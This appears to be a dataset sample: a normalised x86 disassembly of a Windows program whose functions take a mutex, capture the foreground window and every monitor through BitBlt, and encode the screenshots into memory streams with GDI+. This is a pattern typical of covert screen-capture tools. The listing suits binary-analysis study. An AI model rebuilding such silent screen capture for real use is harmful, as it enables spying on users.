mov eax [ ebp - 0x444 ]
push 0x2
je r-xdata
lea ecx [ ebp - 0x234 ]
call sub_401900
lea ecx [ ebp - 0x444 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0xc
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x430 ] esp
push ebx
call sub_402060
lea eax [ ebp - 0x26c ]
push eax
mov ecx esi
call sub_408170
cmp [ ebp - 0x25c ] 0x0
mov [ ebp - 0x4 ] 0x22
jne r-xdata
push 0x0
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x430 ] esp
push eax
call sub_402060
sub esp 0x1c
lea eax [ ebp - 0x234 ]
mov ecx esp
mov [ ebp - 0x434 ] esp
mov [ ebp - 0x4 ] 0x5
push eax
push 0x1
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x430 ] esp
push eax
call sub_402060
sub esp 0x1c
lea edx [ ebp - 0x234 ]
mov ecx esp
mov [ ebp - 0x434 ] esp
mov [ ebp - 0x4 ] 0x4
push edx
jmp r-xdata
push 0x0
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x430 ] esp
push eax
call sub_402060
sub esp 0x1c
lea edx [ ebp - 0x234 ]
mov ecx esp
mov [ ebp - 0x434 ] esp
mov [ ebp - 0x4 ] 0xc
push edx
push 0x1
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x430 ] esp
push eax
call sub_402060
sub esp 0x1c
lea eax [ ebp - 0x234 ]
mov ecx esp
mov [ ebp - 0x434 ] esp
mov [ ebp - 0x4 ] 0xb
push eax
jmp r-xdata
push eax
lea ecx [ ebp - 0x384 ]
call sub_402060
mov ecx [ ebp - 0x234 ]
mov edx 0x8
cmp [ ebp - 0x220 ] edx
jae r-xdata
lea eax [ ebp - 0x2c0 ]
push 0x0
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x430 ] esp
push eax
call sub_402060
sub esp 0x1c
lea eax [ ebp - 0x234 ]
mov ecx esp
mov [ ebp - 0x434 ] esp
mov [ ebp - 0x4 ] 0x1e
push eax
push 0x1
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x430 ] esp
push eax
call sub_402060
sub esp 0x1c
lea edx [ ebp - 0x234 ]
mov ecx esp
mov [ ebp - 0x434 ] esp
mov [ ebp - 0x4 ] 0x1d
push edx
jmp r-xdata
push 0x10
push rw-data
mov ecx edi
call sub_412490
lea ecx [ ebp - 0x288 ]
push ecx
mov ecx edi
call sub_412790
mov ecx [ ebp - 0x450 ]
sub ecx [ ebp - 0x454 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
sub eax 0x3
mov bl 0x23
mov [ ebp - 0x4 ] bl
je r-xdata
lea ecx [ ebp - 0x26c ]
call sub_401900
jmp r-xdata
test edi edi
je r-xdata
call sub_402060
mov [ ebp - 0x4 ] 0x3
mov ecx [ esi + 0x8 ]
call sub_413d40
lea ecx [ ebp - 0x2f8 ]
push ecx
mov ecx [ esi + 0x8 ]
call sub_413cf0
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x4 ] 0x6
call sub_4077d0
lea ecx [ ebp - 0x2f8 ]
mov [ ebp - 0x4 ] 0x3
call sub_401900
push 0x82
push rw-data
mov ecx edi
call sub_412490
lea edx [ ebp - 0x3d8 ]
push edx
mov ecx edi
call sub_412790
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x4 ] 0x7
call sub_4077d0
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x3d8 ]
call sub_402060
mov [ ebp - 0x4 ] bl
mov ecx [ esi + 0x8 ]
call sub_413d40
mov ecx [ esi + 0x8 ]
lea eax [ ebp - 0x3a0 ]
push eax
call sub_413cf0
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x4 ] 0xd
call sub_4077d0
lea ecx [ ebp - 0x3a0 ]
mov [ ebp - 0x4 ] bl
call sub_401900
push 0x82
push rw-data
mov ecx edi
call sub_412490
lea ecx [ ebp - 0x410 ]
push ecx
mov ecx edi
call sub_412790
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x4 ] 0xe
call sub_4077d0
lea ecx [ ebp - 0x410 ]
mov [ ebp - 0x4 ] bl
call sub_401900
sub esp 0x1c
lea edx [ ebp - 0x250 ]
mov ecx esp
mov [ ebp - 0x430 ] esp
push edx
call sub_402060
mov ecx esi
call sub_407b20
lea ecx [ ebp - 0x444 ]
call sub_404be0
lea ecx [ ebp - 0x250 ]
call sub_401900
lea ecx [ ebp - 0x234 ]
call sub_401900
lea ecx [ ebp - 0x444 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_402660
jmp r-xdata
cmp [ eax + 0x14 ] edx
jb r-xdata
lea ecx [ ebp - 0x234 ]
call sub_401900
sub esp 0x1c
lea eax [ ebp - 0x250 ]
mov ecx esp
mov [ ebp - 0x430 ] esp
push eax
call sub_402060
mov ecx esi
call sub_407b20
lea ecx [ ebp - 0x444 ]
call sub_404be0
lea ecx [ ebp - 0x250 ]
call sub_401900
lea ecx [ ebp - 0x234 ]
call sub_401900
lea ecx [ ebp - 0x444 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_402660
jmp r-xdata
call sub_402060
mov [ ebp - 0x4 ] bl
mov ecx [ esi + 0x8 ]
call sub_413d40
lea ecx [ ebp - 0x3f4 ]
push ecx
mov ecx [ esi + 0x8 ]
call sub_413cf0
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x4 ] 0x1f
call sub_4077d0
lea ecx [ ebp - 0x3f4 ]
mov [ ebp - 0x4 ] bl
call sub_401900
push 0x82
push rw-data
mov ecx edi
call sub_412490
lea edx [ ebp - 0x42c ]
push edx
mov ecx edi
call sub_412790
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x4 ] 0x20
call sub_4077d0
mov [ ebp - 0x4 ] bl
lea ecx [ ebp - 0x42c ]
jmp r-xdata
mov eax [ ebp - 0x454 ]
mov ecx [ rw-data ]
add eax 0x38
push ecx
push eax
call sub_406dc0
add esp 0x8
test al al
mov eax [ ebp - 0x454 ]
push 0x3
je r-xdata
dec eax
jne r-xdata
push ecx
push eax
lea edx [ ebp - 0x218 ]
push edx
call [ wsprintfW@IAT ]
add esp 0xc
lea ecx [ ebp - 0x384 ]
mov ebx eax
call sub_401900
push ebx
lea eax [ ebp - 0x218 ]
push eax
lea ecx [ ebp - 0x3bc ]
call sub_4078e0
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x2a4 ]
mov [ ebp - 0x4 ] 0x19
call sub_4077d0
lea ecx [ ebp - 0x3bc ]
mov [ ebp - 0x4 ] 0x18
call sub_401900
sub esp 0x1c
lea edx [ ebp - 0x2a4 ]
mov ecx esp
mov [ ebp - 0x430 ] esp
push edx
call sub_402060
mov ecx esi
call sub_407b20
lea ecx [ ebp - 0x444 ]
call sub_404be0
lea ecx [ ebp - 0x2c0 ]
call sub_401900
lea ecx [ ebp - 0x2dc ]
call sub_401900
lea ecx [ ebp - 0x2a4 ]
call sub_401900
lea ecx [ ebp - 0x234 ]
call sub_401900
lea ecx [ ebp - 0x250 ]
call sub_401900
lea ecx [ ebp - 0x444 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_402660
jmp r-xdata
mov eax [ eax ]
push 0x0
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x430 ] esp
push eax
call sub_402060
sub esp 0x1c
lea eax [ ebp - 0x26c ]
mov ecx esp
mov [ ebp - 0x434 ] esp
mov [ ebp - 0x4 ] 0x25
push eax
push 0x1
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x430 ] esp
push eax
call sub_402060
sub esp 0x1c
lea edx [ ebp - 0x26c ]
mov ecx esp
mov [ ebp - 0x434 ] esp
mov [ ebp - 0x4 ] 0x24
push edx
jmp r-xdata
lea ecx [ ebp - 0x368 ]
push ecx
mov ecx [ esi + 0x8 ]
call sub_413cf0
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x288 ]
mov [ ebp - 0x4 ] 0x28
call sub_4077d0
lea ecx [ ebp - 0x368 ]
mov [ ebp - 0x4 ] bl
call sub_401900
push 0x82
push rw-data
mov ecx edi
call sub_412490
lea edx [ ebp - 0x34c ]
push edx
mov ecx edi
call sub_412790
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x288 ]
mov [ ebp - 0x4 ] 0x29
call sub_4077d0
lea ecx [ ebp - 0x34c ]
mov [ ebp - 0x4 ] bl
call sub_401900
sub esp 0x1c
lea eax [ ebp - 0x288 ]
mov ecx esp
mov [ ebp - 0x430 ] esp
push eax
call sub_402060
mov ecx esi
call sub_407b20
lea ecx [ ebp - 0x454 ]
call sub_404be0
lea ecx [ ebp - 0x288 ]
call sub_401900
lea ecx [ ebp - 0x26c ]
call sub_401900
lea ecx [ ebp - 0x454 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_402660
jmp r-xdata
mov eax [ ebp - 0x454 ]
sub esp 0x1c
add eax 0x38
mov ecx esp
mov [ ebp - 0x430 ] esp
push eax
call sub_402060
mov ecx [ esi + 0x8 ]
call sub_407ab0
mov eax [ ebp - 0x454 ]
mov edx [ rw-data ]
add eax 0x54
push edx
push eax
call sub_406dc0
add esp 0x8
test al al
mov eax [ ebp - 0x454 ]
push 0x3
je r-xdata
call sub_402060
mov [ ebp - 0x4 ] bl
mov ecx [ esi + 0x8 ]
call sub_413d40
push 0x0
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x430 ] esp
push eax
call sub_402060
sub esp 0x1c
lea edx [ ebp - 0x26c ]
mov ecx esp
mov [ ebp - 0x434 ] esp
mov [ ebp - 0x4 ] 0x27
push edx
push 0x1
sub esp 0x1c
add eax 0x1c
mov ecx esp
mov [ ebp - 0x430 ] esp
push eax
call sub_402060
sub esp 0x1c
lea eax [ ebp - 0x26c ]
mov ecx esp
mov [ ebp - 0x434 ] esp
mov [ ebp - 0x4 ] 0x26
push eax
jmp r-xdata
call sub_402060
mov [ ebp - 0x4 ] bl
mov ecx [ esi + 0x8 ]
call sub_413d40
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x430 ] esp
push r--data
call sub_403cc0
mov ecx [ esi + 0x8 ]
call sub_407ab0
jmp r-xdata
sub_409710
push ebp
mov ebp esp
push 0xffffffff
push sub_42d898
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
push 0x0
push 0x0
push 0x0
call [ CreateMutexW@IAT ]
mov [ edi + 0x44 ] eax
test eax eax
jne r-xdata
mov esi [ Sleep@IAT ]
push 0x14
call esi
cmp [ edi + 0x3c ] 0x0
je r-xdata
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x14 ] r--data
call sub_419f0f
push r--data
lea ecx [ ebp - 0x30 ]
push ecx
call sub_41ac98
push 0x14
call esi
jmp r-xdata
lea edx [ ebp - 0x3c ]
lea ecx [ edi + 0x2c ]
push edx
call sub_4019f0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov edx [ eax + ecx * 8 + 0x4 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ eax ]
xor esi esi
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x18 ] ecx
test edx edx
je r-xdata
sub eax esi
mov ecx [ eax + 0x8 ]
mov esi [ edx + 0x8 ]
mov eax ecx
shr eax 0x1
and ecx 0x1
cmp esi eax
ja r-xdata
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0xc ]
mov ecx [ edx + 0x8 ]
mov dl [ edx + 0x6 ]
push eax
mov [ ebp - 0x1c ] dl
mov eax [ ebp - 0x1c ]
push ecx
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x0
call sub_4089c0
lea ecx [ edi + 0x2c ]
call sub_407a40
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
mov ecx [ edx + 0x4 ]
test ecx ecx
je r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov esi [ ebp - 0x20 ]
jmp r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
lea edi [ ecx + 0x1 ]
lea ebx [ edx + 0x4 ]
mov eax ecx
[ ebx ] edi
cmp eax ecx
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
jmp r-xdata
mov ecx [ ebp - 0x18 ]
push edx
push ecx
lea ecx [ ebp - 0x24 ]
call sub_4030d0
mov ecx [ edx + 0x4 ]
test ecx ecx
jne r-xdata
jmp r-xdata
mov edi [ ebp - 0x10 ]
sub_409890
push ebp
mov ebp esp
sub esp 0x8
push esi
push edi
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x4 ]
xor edi edi
push ecx
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
call GdipGetImageEncodersSize
mov esi [ ebp - 0x8 ]
cmp esi edi
jne r-xdata
push ebx
push esi
call sub_41ae2a
mov ebx eax
add esp 0x4
cmp ebx edi
jne r-xdata
pop edi
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x4 ]
push ebx
push esi
push edx
call GdipGetImageEncoders
xor esi esi
cmp [ ebp - 0x4 ] edi
jbe r-xdata
pop ebx
pop edi
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn 0x8
push ebx
call sub_41a7eb
add esp 0x4
pop ebx
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x8
lea edi [ ebx + 0x30 ]
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
imul eax eax 0x4c
mov edx [ eax + ebx ]
add eax ebx
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
push ebx
mov [ ecx + 0xc ] eax
call sub_41a7eb
add esp 0x4
pop ebx
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
inc esi
add edi 0x4c
cmp esi [ ebp - 0x4 ]
jb r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ edi ]
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sub_409980
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call GdipDisposeImage
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call GdipFree
sub_4099b0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
mov [ ebp - 0x4 ] 0x0
call GdipCloneImage
test eax eax
je r-xdata
push 0x10
call GdipAlloc
test eax eax
je r-xdata
mov [ esi + 0x8 ] eax
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov esi [ esi + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
pop esi
mov esp ebp
pop ebp
retn
sub_409a00
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
sub eax [ esi ]
push edi
sar eax 0x2
xor edi edi
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
mov edi [ esi ]
cmp edi ecx
je r-xdata
mov ebx [ DeleteObject@IAT ]
lea esp [ esp ]
mov eax [ esi ]
test eax eax
je r-xdata
mov eax ecx
sub eax ecx
sar eax 0x2
lea ebx [ eax * 4 ]
push ebx
push ecx
push edi
call sub_41a460
add esp 0xc
add ebx edi
mov [ esi + 0x4 ] ebx
mov ecx [ esi ]
mov edx [ ecx + edi * 4 ]
push edx
call ebx
mov eax [ esi + 0x4 ]
sub eax [ esi ]
inc edi
sar eax 0x2
cmp edi eax
jb r-xdata
xor eax eax
pop edi
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ebx
retn
push eax
call sub_41a0d6
add esp 0x4
sub_409a80
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ebx
mov ebx [ GetDeviceCaps@IAT ]
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x8
push esi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
call ebx
push 0xa
push esi
mov edi eax
call ebx
push esi
mov ebx eax
call [ CreateCompatibleDC@IAT ]
push ebx
push edi
push esi
mov [ ebp + 0x10 ] eax
call [ CreateCompatibleBitmap@IAT ]
push eax
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x10 ]
push eax
call [ SelectObject@IAT ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
push 0x40cc0020
push ecx
push edx
push esi
push ebx
push edi
push 0x0
mov [ ebp + 0xc ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push eax
call [ BitBlt@IAT ]
lea ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0x14 ]
call sub_4039d0
mov edi [ DeleteObject@IAT ]
push esi
call edi
mov edx [ ebp + 0xc ]
push edx
call edi
mov eax [ ebp - 0xc ]
push eax
call edi
push esi
call edi
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_409b30
push esi
mov esi ecx
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
push edi
cmp ecx eax
je r-xdata
mov ecx [ esi + 0x4 ]
mov edi [ esi ]
cmp edi ecx
je r-xdata
sub eax ecx
sar eax 0x2
xor edi edi
test eax eax
je r-xdata
push 0x0
call [ GetDC@IAT ]
push esi
push sub_409a80
mov edi eax
push 0x0
push edi
call [ EnumDisplayMonitors@IAT ]
push edi
push 0x0
call [ ReleaseDC@IAT ]
push edi
call [ DeleteObject@IAT ]
pop edi
mov al 0x1
pop esi
retn
mov eax ecx
sub eax ecx
push ebx
sar eax 0x2
lea ebx [ eax * 4 ]
push ebx
push ecx
push edi
call sub_41a460
add esp 0xc
add ebx edi
mov [ esi + 0x4 ] ebx
pop ebx
mov eax [ esi ]
mov ecx [ eax + edi * 4 ]
push ecx
call [ DeleteObject@IAT ]
mov edx [ esi + 0x4 ]
sub edx [ esi ]
inc edi
sar edx 0x2
cmp edi edx
jb r-xdata
sub_409bc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
call sub_409b30
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
mov ebx eax
sub ebx ecx
sar ebx 0x2
cmp ecx eax
je r-xdata
mov edx [ esi ]
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
cmp edx ecx
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov eax ecx
sub eax ecx
sar eax 0x2
lea edi [ eax * 4 ]
push edi
push ecx
push edx
call sub_41a460
add esp 0xc
add edi [ ebp - 0x4 ]
mov [ esi + 0x4 ] edi
mov eax [ esi ]
mov ecx [ eax + edi * 4 ]
push ecx
call [ DeleteObject@IAT ]
mov edx [ esi + 0x4 ]
sub edx [ esi ]
inc edi
sar edx 0x2
cmp edi edx
jb r-xdata
sub_409c40
push ebp
mov ebp esp
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
push edi
mov [ ebp - 0x60 ] eax
xor eax eax
push eax
lea edx [ ebp - 0x7c ]
mov [ ebp - 0x78 ] eax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x70 ] eax
mov esi ecx
mov ecx [ ebp + 0xc ]
push edx
lea eax [ ebp - 0x68 ]
push eax
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x7c ] 0x1
call GdiplusStartup
mov ecx esi
mov [ ebp - 0x45 ] 0x0
call sub_409b30
mov ecx [ esi ]
mov edi [ GetDeviceCaps@IAT ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push 0x0
call [ GetDC@IAT ]
mov ebx eax
push 0xa
push ebx
call edi
push 0x8
push ebx
mov [ ebp - 0x54 ] eax
call edi
mov edx [ ebp - 0x54 ]
push edx
push eax
push ebx
call [ CreateCompatibleBitmap@IAT ]
mov ebx [ ebp - 0x4c ]
call [ GetForegroundWindow@IAT ]
lea edx [ ebp - 0x24 ]
push edx
push eax
mov [ ebp - 0x54 ] eax
call [ GetWindowRect@IAT ]
mov eax [ ebp - 0x54 ]
mov edi [ ebp - 0x1c ]
mov ebx [ ebp - 0x18 ]
sub edi [ ebp - 0x24 ]
sub ebx [ ebp - 0x20 ]
push eax
call [ GetWindowDC@IAT ]
mov ecx [ ebp - 0x18 ]
sub ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
sub edx [ ebp - 0x24 ]
push ecx
push edx
mov [ ebp - 0x50 ] eax
push eax
mov eax [ esi ]
cmp eax [ esi + 0x4 ]
je r-xdata
xor edi edi
mov edx [ ebp - 0x5c ]
lea ecx [ ebp - 0x4c ]
push ecx
push 0x0
push edx
mov [ edi ] r--data
mov [ ebp - 0x4c ] 0x0
call GdipCreateBitmapFromHBITMAP
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x4c ]
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax [ eax + ebx * 4 ]
push 0xa
push eax
mov [ ebp - 0x50 ] eax
call edi
mov ebx eax
mov eax [ ebp - 0x50 ]
push 0x8
push eax
call edi
mov ecx [ ebp - 0x50 ]
push ebx
mov edi eax
push edi
push ecx
jmp r-xdata
test edi edi
je r-xdata
mov edx [ ebp - 0x58 ]
lea eax [ ebp - 0x44 ]
push eax
mov eax [ edi + 0x4 ]
lea ecx [ ebp - 0x14 ]
push ecx
push edx
push eax
call GdipSaveImageToStream
test eax eax
je r-xdata
mov ecx [ r--data ]
mov eax [ r--data ]
mov edx [ r--data ]
mov [ ebp - 0x40 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x14 ]
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x3c ] edx
mov ebx 0x1
lea edx [ ebp + 0x10 ]
push ecx
mov ecx esi
mov [ ebp - 0x4c ] edi
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x2c ] 0x4
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] edx
call sub_409890
lea edx [ ebp - 0x58 ]
push edx
push ebx
push 0x0
call [ CreateStreamOnHGlobal@IAT ]
test eax eax
js r-xdata
call [ CreateCompatibleBitmap@IAT ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x50 ]
push eax
call [ CreateCompatibleDC@IAT ]
mov ecx [ ebp - 0x5c ]
push ecx
push eax
mov [ ebp - 0x54 ] eax
call [ SelectObject@IAT ]
mov edx [ ebp - 0x50 ]
push 0xcc0020
push 0x0
push 0x0
push edx
push ebx
push edi
push 0x0
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x54 ]
push 0x0
push eax
call [ BitBlt@IAT ]
push 0x10
call GdipAlloc
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x54 ]
mov ebx [ DeleteObject@IAT ]
push eax
call ebx
mov ecx [ ebp - 0x5c ]
push ecx
call ebx
mov edx [ ebp - 0x6c ]
push edx
call ebx
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx eax
sar ecx 0x2
xor edi edi
test ecx ecx
je r-xdata
mov eax [ edi ]
mov edx [ eax ]
push 0x1
mov ecx edi
call edx
mov edx [ ebp - 0x58 ]
mov edi [ edx ]
lea ebx [ ebp - 0x84 ]
push ebx
push 0x2
xor ecx ecx
push ecx
mov ecx [ edi + 0x14 ]
xor eax eax
push eax
push edx
call ecx
test eax eax
js r-xdata
mov [ edi + 0x8 ] eax
jmp r-xdata
mov edx [ ebp - 0x50 ]
push edx
call ebx
mov eax [ ebp - 0x68 ]
push eax
call GdiplusShutdown
mov ecx [ ebp - 0x4 ]
mov al [ ebp - 0x45 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
mov esp ebp
pop ebp
retn 0x14
mov edx [ eax + edi * 4 ]
push edx
call ebx
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx eax
inc edi
sar ecx 0x2
cmp edi ecx
jb r-xdata
mov edi [ ebp - 0x4c ]
mov edx [ ebp - 0x58 ]
mov edi [ edx ]
xor ecx ecx
push ecx
push ecx
push ecx
xor eax eax
push eax
push edx
mov edx [ edi + 0x14 ]
call edx
test eax eax
js r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x84 ]
mov edi [ ebp - 0x64 ]
push 0x1
push eax
mov [ edi ] eax
call sub_41acef
mov ecx [ ebp - 0x60 ]
add esp 0x8
mov [ ecx ] eax
test eax eax
je r-xdata
mov edi [ edi ]
mov ecx [ ebp - 0x58 ]
mov edx [ ecx ]
push 0x0
push edi
push eax
mov eax [ edx + 0xc ]
push ecx
call eax
test eax eax
js r-xdata
mov [ ebp - 0x45 ] 0x1
sub_409f40
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
push edi
cmp esi 0x4
jb r-xdata
test esi esi
je r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn
movzx eax [ edx ]
movzx edi [ ecx ]
sub eax edi
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
sar eax 0x1f
pop edi
or eax 0x1
pop esi
pop ebp
retn
cmp esi 0x1
jbe r-xdata
movzx eax [ edx + 0x1 ]
movzx edi [ ecx + 0x1 ]
sub eax edi
jne r-xdata
cmp esi 0x2
jbe r-xdata
movzx eax [ edx + 0x2 ]
movzx edi [ ecx + 0x2 ]
sub eax edi
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_409fc0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_419789
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x4 ]
call sub_4197b1
pop esi
mov esp ebp
pop ebp
retn
inc eax
mov [ esi + 0x4 ] eax
sub_409ff0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_419789
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi edi
call sub_4197b1
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
cmp eax 0xffffffff
jae r-xdata
dec eax
mov [ edi + 0x4 ] eax
sub_40a040
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ecx ]
test edi edi
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_419789
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x4 ]
not esi
call sub_4197b1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
pop esi
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_40a090
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x30 ]
push esi
mov esi [ eax ]
push edi
mov edi [ ebp + 0x8 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov [ edi ] esi
call sub_419789
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp + 0x8 ]
call sub_4197b1
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_40a0d0
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_419c87
add esp 0x4
